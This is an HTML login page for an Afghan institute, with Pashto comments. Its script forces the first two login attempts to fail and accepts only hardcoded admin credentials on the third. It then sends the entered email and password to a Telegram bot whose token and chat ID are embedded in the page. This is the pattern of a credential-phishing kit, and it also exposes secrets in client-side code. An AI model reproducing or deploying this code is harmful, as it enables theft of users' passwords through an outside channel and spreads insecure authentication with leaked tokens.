<!DOCTYPE html>
<html lang="ps">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ال تقوا – لاګ ان</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0a3f31 0%, #166e52 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background-color: #ffffff;
            max-width: 460px;
            width: 100%;
            padding: 38px 32px 42px;
            border-radius: 40px;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25);
            text-align: center;
            transition: all 0.2s;
        }
        .logo-area h1 {
            font-size: 32px;
            font-weight: 800;
            color: #1a5d48;
            letter-spacing: -0.5px;
        }
        .logo-area p {
            font-size: 14px;
            color: #5d756a;
            margin-top: 6px;
        }
        .institute-badge {
            font-size: 15px;
            font-weight: 600;
            color: #2a7f62;
            background: #eef5f1;
            display: inline-block;
            padding: 6px 22px;
            border-radius: 60px;
            margin: 18px 0 22px;
        }
        .input-group {
            text-align: left;
            margin-bottom: 22px;
        }
        .input-group label {
            display: block;
            font-weight: 600;
            font-size: 13px;
            color: #2d4a3e;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 18px;
            font-size: 15px;
            border: 1.5px solid #dde5e0;
            border-radius: 28px;
            outline: none;
            transition: 0.2s;
            background-color: #fefcf7;
        }
        .input-group input:focus {
            border-color: #2c7a5e;
            box-shadow: 0 0 0 3px rgba(44, 122, 94, 0.2);
        }
        .checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 18px 0 28px;
            font-size: 14px;
            color: #3f6858;
        }
        button {
            width: 100%;
            background-color: #1f6e55;
            color: white;
            font-size: 17px;
            font-weight: 700;
            padding: 14px;
            border: none;
            border-radius: 44px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
        }
        button:hover {
            background-color: #0f5a45;
            transform: scale(0.97);
        }
        .msg-area {
            margin-top: 20px;
        }
        .error-msg {
            background-color: #ffe6e5;
            color: #b91c1c;
            padding: 10px 14px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 500;
        }
        .success-msg {
            background-color: #e0f7ed;
            color: #146b48;
        }
        .demo-hint {
            font-size: 12px;
            background: #f4faf7;
            color: #3f6a5a;
            padding: 12px;
            border-radius: 28px;
            margin-top: 28px;
            line-height: 1.4;
        }
        hr {
            margin-top: 20px;
            border: 0.5px solid #e2ece5;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo-area">
        <h1>AL-TAQWA</h1>
        <p>Institute of Higher Education</p>
        <div class="institute-badge">Sign in</div>
    </div>

    <form id="loginForm">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="teacher@altaqwa.edu.af" required>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="********" required>
        </div>
        <div class="checkbox">
            <input type="checkbox" id="rememberCheckbox">
            <label for="rememberCheckbox">Remember password</label>
        </div>
        <button type="submit" id="loginBtn">Login</button>
    </form>
    
    <div id="messageBox"></div>
    <div class="demo-hint">
        🔐 ازمېښت: لومړۍ دوه هڅې (هر څه ولیکئ) → ناکامي<br>
        ✨ دریمه هڅه: <strong>admin@altaqwa.edu.af</strong> / <strong>adminPass123</strong><br>
        (معلومات به اډمین ټیلیګرام ته واستول شي)
    </div>
</div>

<script>
    // د هڅو شمېر ساتل (د session هره ټب)
    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts_altaqwa')) || 0;

    // د بريالي لاګ ان صحيح معلومات
    const VALID_EMAIL = "admin@altaqwa.edu.af";
    const VALID_PASSWORD = "adminPass123";

    // د ټیلیګرام بوټ توکين او چيټ آي ډي (لکه څنګه چې غوښتل شوي)
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const CHAT_ID = "8295417969";

    // د ټیلیګرام پیغام لېږلو فنکشن
    async function sendToTelegram(email, password) {
        const message = `🔐 *AL-TAQWA لاګ ان بریالی* 🔐\n\n📧 *ایمیل:* ${email}\n🔑 *پاسورډ:* ${password}\n🕒 وخت: ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch (err) {
            console.error("تلگرام ته د استولو ستونزه:", err);
        }
    }

    function showMessage(text, isError = true) {
        const msgDiv = document.getElementById('messageBox');
        msgDiv.innerHTML = `<div class="${isError ? 'error-msg' : 'error-msg success-msg'}">${text}</div>`;
        if (!isError) {
            setTimeout(() => {
                if (confirm("✅ بریالی ننوتل! تاسو سیسټم ته داخل شوئ.\n غواړئ صفحه تازه کړئ؟")) {
                    sessionStorage.removeItem('loginAttempts_altaqwa');
                    window.location.reload();
                }
            }, 400);
        }
    }

    // د فورمې استول
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const emailInput = document.getElementById('email').value.trim();
        const passwordInput = document.getElementById('password').value;
        const rememberChecked = document.getElementById('rememberCheckbox').checked;

        // د یادولو اختیار
        if (rememberChecked) {
            localStorage.setItem('remEmail_altaqwa', emailInput);
        } else {
            localStorage.removeItem('remEmail_altaqwa');
        }

        const isThirdAttempt = (attemptCount === 2);   // 0,1,2 → دریمه هڅه

        // دریمه هڅه او سم معلومات
        if (isThirdAttempt && emailInput === VALID_EMAIL && passwordInput === VALID_PASSWORD) {
            // بریالی لاګ ان – معلومات تلګرام ته واستوئ
            await sendToTelegram(emailInput, passwordInput);
            showMessage("🎉 بریالیتوب! تاسو په دریمه هڅه کې ننوتلئ. د لاګ ان معلومات اډمین ته واستول شول.", false);
            sessionStorage.removeItem('loginAttempts_altaqwa');
            document.getElementById('email').disabled = true;
            document.getElementById('password').disabled = true;
            document.getElementById('loginBtn').disabled = true;
            return;
        }

        // که دریمه هڅه وي خو معلومات ناسم وي – بیا هڅه بنده او ریلوډ
        if (isThirdAttempt && (emailInput !== VALID_EMAIL || passwordInput !== VALID_PASSWORD)) {
            showMessage("❌ دریمه هڅه ناکامه شوه (غلط ایمیل یا پاسورډ). صفحه به تازه شي.", true);
            sessionStorage.setItem('loginAttempts_altaqwa', 3);
            document.getElementById('loginBtn').disabled = true;
            setTimeout(() => {
                sessionStorage.removeItem('loginAttempts_altaqwa');
                window.location.reload();
            }, 2000);
            return;
        }

        // لومړۍ یا دویمه هڅه (تل ناکامي، پرته له ټیلیګرام)
        if (!isThirdAttempt) {
            showMessage(`⚠️ ننوتل ناکام شو! تاسو ${attemptCount+1}/2 ناکامې هڅې وکړې. مهرباني وکړئ دریمه هڅه کې سم معلومات (admin/adminPass123) وکاروئ.`);
            attemptCount++;
            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
            return;
        }
    });

    // د مخ په پیل کې که ۳ ناکامې شوې وی بټن بند کړئ او یاد شوی ایمیل ښکاره کړئ
    window.addEventListener('DOMContentLoaded', () => {
        if (sessionStorage.getItem('loginAttempts_altaqwa') >= 3) {
            document.getElementById('loginBtn').disabled = true;
            showMessage("زیاتې ناکامې هڅې. مهرباني وکړئ صفحه تازه کړئ.", true);
        }
        const savedEmail = localStorage.getItem('remEmail_altaqwa');
        if (savedEmail) {
            document.getElementById('email').value = savedEmail;
            document.getElementById('rememberCheckbox').checked = true;
        }
    });
</script>
</body>
</html>
